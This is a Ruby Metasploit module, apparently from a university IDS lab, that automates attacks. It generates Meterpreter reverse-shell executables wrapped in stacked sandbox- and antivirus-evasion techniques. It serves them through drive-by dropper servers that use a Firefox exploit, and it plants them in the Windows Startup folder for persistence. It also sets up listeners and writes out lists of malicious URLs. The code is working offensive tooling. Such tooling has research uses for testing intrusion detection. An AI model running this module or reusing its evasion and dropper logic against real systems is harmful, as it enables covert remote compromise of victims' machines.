##
# multi_dropper.rb
#
# Creates a series of evasive executables and sets up a driveby_dropper
# for each one.
#
# Aubrey Alston (ada2145@columbia.edu)
#
# (This module and reliant files must be placed into Metasploit modules directory.)
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'fileutils'

class Metasploit3 < Msf::Auxiliary

	def initialize(info = {})
		super(update_info(info,
		  'Name'           => 'IDS Multi-Dropper',
		  'Description'    => %q{
		  	Creates a series of evasive executables and sets up a driveby_dropper
        for each one.
		  },
		  'Author'         => [ 'Aubrey Alston, IDS Laboratory, Columbia University (ada2145@columbia.edu)' ],
		  'License'        => MSF_LICENSE
		))
		register_options(
		[
      OptBool.new('GENERATOR', [true, 'If set to true causes module to only generate executables.  Set to false to instantiate servers.', true]),
      OptString.new('EVASION_TECHNIQUES', [true, 'Specify a semi-colon-separated list of evasions to use.', 'patience-loop(10000000000000);memory-bomb(500000000,01);create-file(C:/Program Files/Mozilla Firefox/file.tmp);hold-mutex(metcon.exe,amutex);attempt-system-access(3);resource-burn(500000,50,10000000000);who-am-i(metcon.exe)']),
		  OptString.new('EXPLOIT', [ false, 'Set browser exploit to use.', "auxiliary/pro/ids/blind_firefox_crmfrequest" ]),
		  OptString.new('SHELL', [false, 'Set reverse shell payload to use with this exploit.', "windows/meterpreter/reverse_tcp"]),
		  OptInt.new('TARGET', [false, 'Set desired target for this payload. (See "SHOW TARGETS" for used exploit.)', 1]),
		  OptString.new('HOST', [false, 'Set host for the web servers.', "127.0.0.1"]),
		  OptString.new('STARTPORT', [false, 'Set first port in port range used for all servers and listeners.', "8080"]),
		  OptString.new('URIPATH', [false, 'Set malicious URL path for each dropper.', "/"]),
		  OptString.new('DROPDIRS', [false, 'Location on target to place file once compromised (separate by semi-colons).', 
		  	'C:/Documents and Settings/All Users/Start Menu/Programs/Startup']),
		  OptString.new('DROPNAME', [true, "Destination name for file dropped onto target's machine.", "metcon.exe"]),
      OptString.new('PAYLOAD_EXECUTABLE', [true, "Payload to use to create executables.", "windows/meterpreter/reverse_tcp"]),
      OptBool.new('NETWORK_EVADE', [true, "Set to true to attempt network evasion.", true]),
      OptInt.new('SERVSTART',[true,'Starting server', 1]),
      OptInt.new('SERVEND',[true,'Ending server', 40])
		], self.class)

  end
  
  def run
    @stopped = false
  	# Generate the script which drops the file once a session is obtained.
  	print_status("Generating combinations of specified evasions...")
    evasions = datastore["EVASION_TECHNIQUES"].split(";")
    combinations = []
    for i in (1..evasions.length)
      for x in evasions.combination(i)
        result = ""
        for z in (0..(x.length-1))
          result = result + x[z]
          if z < x.length-1
            result = result + ";"
          end
        end
        combinations.push(result)
      end
    end
  	
    print_status("Setting up attack instances...")
    @sessions = []
    port = datastore["STARTPORT"].to_i

    if datastore["GENERATOR"]

      for i in ((datastore["SERVSTART"]-1..(datastore["SERVEND"]-1)))
        session_dir = File.dirname(__FILE__)+'/tmp/multi_session/'+i.to_s
        # Create directory to hold executable
        FileUtils::mkdir_p session_dir

        print_status("Generating evasive malicious executable "+(i+1).to_s+"/"+combinations.length.to_s)
        print_status("Evasion stack: " + combinations[i])
        generator = framework.modules.create("auxiliary/pro/ids/evasion_applicator")
        generator.datastore["LIST_TECHNIQUES"] = false
        generator.datastore["PAYLOAD"] = datastore["PAYLOAD_EXECUTABLE"]
        generator.datastore["PAYLOAD_OPTIONS"] = "LHOST="+datastore["HOST"]+" LPORT="+port.to_s
        generator.datastore["OUTPUT_DIRECTORY"] = session_dir
        generator.datastore["EXECUTABLE_NAME"] = datastore["DROPNAME"]
        generator.datastore["EVASION_STACK"] = combinations[i]
        generator.run_simple(
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'    => false
        )

        port = port + 3
      end

      print_status("All executables generated.")
      return
    end

    for i in ((datastore["SERVSTART"]-1..(datastore["SERVEND"]-1)))

      if @stopped
        break
      end

      session_dir = File.dirname(__FILE__)+'/tmp/multi_session/'+i.to_s

      print_status("Setting up instance "+(i+1).to_s+"/"+combinations.length.to_s)

      session = [0,0]
      print_status("Setting up listener for executable payload...")
      handler = framework.modules.create("exploit/multi/handler")
      handler.datastore["LHOST"] = datastore["HOST"]
      handler.datastore["LPORT"] = port.to_s
      handler.datastore["ExitOnSession"] = false
      if datastore["NETWORK_EVADE"]
        handler.datastore["EnableStageEncoding"] = true
      end
      handler.exploit_simple(
        'LocalInput'  => self.user_input,
        'LocalOutput' => self.user_output,
        'Payload'   => datastore["PAYLOAD_EXECUTABLE"],
        'RunAsJob'    => true
      )

      handler = framework.jobs[handler.job_id.to_s].ctx[0]
      session[0] = handler

      print_status("Starting drive-by dropper...")
      dropper = framework.modules.create("auxiliary/pro/ids/driveby_dropper")
      dropper.datastore["HOST"] = datastore["HOST"]
      dropper.datastore["SRVPORT"] = (port+1).to_s
      dropper.datastore["LPORT"] = (port+2).to_s
      dropper.datastore["URIPATH"] = datastore["URIPATH"]
      dropper.datastore["DROPDIRS"] = datastore["DROPDIRS"]
      dropper.datastore["DROPFILE"] = session_dir+"/"+datastore["DROPNAME"]
      dropper.datastore["DROPNAME"] = datastore["DROPNAME"]
      dropper.datastore["NETWORK_EVADE"] = datastore["NETWORK_EVADE"]
      dropper.run_simple(
        'LocalInput'  => self.user_input,
        'LocalOutput' => self.user_output,
        'RunAsJob'    => true
      )

      dropper = framework.jobs[dropper.job_id.to_s].ctx[0]
      session[1] = dropper

      @sessions.push(session)

      port = port + 3

      Rex::ThreadSafe.sleep(1)
    end

    # Generate executables separately from setting up instances
    # Write file/restart 

    print_status("All instances active.  Printing file containing malicious URLs...")
    file = File.open(File.dirname(__FILE__)+"/attack_urls", "w")
    for session in @sessions
      file.puts session[1].datastore["HOST"]+":"+session[1].datastore["SRVPORT"]+session[1].datastore["URIPATH"]
    end
    file.close

    print_status("File can be found at "+File.dirname(__FILE__)+"/attack_urls")

    print_status("Printing line-by-line mapping of evasions to attack instances...")
    file = File.open(File.dirname(__FILE__)+"/attack_mapping", "w")
    for combination in combinations
      file.puts combination
    end
    file.close


    while not @stopped
      Rex::ThreadSafe.sleep(5)
    end
  end

  # Kill the instance and clean up.
  def cleanup
    @stopped = true
  	print_status("Cleaning up resources.")
  	if not Dir["directory"].empty?
      FileUtils.rm_r File.dirname(__FILE__)+'/tmp/multi_session'
    end

    print_status("Stopping all malicious attack instances.")
    for session in @sessions
      session[0].cleanup
      session[1].cleanup
    end
  end

end